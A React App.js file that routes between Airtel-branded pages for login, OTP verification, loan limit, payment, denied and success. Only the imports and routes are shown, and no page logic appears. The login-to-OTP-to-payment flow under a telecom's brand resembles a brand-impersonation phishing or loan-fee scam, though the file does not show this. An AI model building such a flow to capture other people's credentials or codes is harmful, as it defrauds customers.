import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import AirtelLogin from './AirtelLogin';
import AirtelOTPVerify from './AirtelOTPVerify';
import AirtelLoanLimit from './AirtelLoanLimit';
import AirtelPayment from './AirtelPayment';
import AirtelDenied from './AirtelDenied'; // <-- Import
import AirtelSuccess from './AirtelSuccess'; // <-- Import

function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<AirtelLogin />} />
        <Route path="/airtel-otp" element={<AirtelOTPVerify />} />
        <Route path="/airtel-loan-limit" element={<AirtelLoanLimit />} />
        <Route path="/airtel-payment" element={<AirtelPayment />} />
        <Route path="/airtel-denied" element={<AirtelDenied />} /> {/* <-- Add route */}
        <Route path="/airtel-success" element={<AirtelSuccess />} /> {/* <-- Add route */}
      </Routes>
    </Router>
  );
}

export default App;